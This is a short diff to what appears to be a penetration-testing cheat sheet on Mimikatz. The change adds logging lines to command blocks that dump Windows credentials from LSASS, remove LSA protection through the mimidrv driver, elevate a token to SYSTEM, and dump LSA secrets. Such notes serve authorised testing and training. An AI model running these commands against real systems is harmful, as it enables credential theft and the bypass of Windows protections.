@@ -15,6 +15,8 @@ In 2012, Microsoft implemented an LSA protection, to keep LSASS from being acces
 
 ```powershell
 privilege::debug
+# Log to a txt file as the output can get very large 
+log 
 sekurlsa::logonpasswords
 # ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 # Means LSA protection:
@@ -22,9 +24,10 @@ sekurlsa::logonpasswords
 !processprotect /process:lsass.exe /remove
 ```
 
-
 ```powershell
 privilege::debug # enables the _SeDebugPrivilge_ access right
+# Log to a txt file as the output can get very large 
+log 
 token::elevate # elevate the security token Administrator -> SYSTEM
 !+ # LSA protection bypass!
 lsadump::lsa /patch
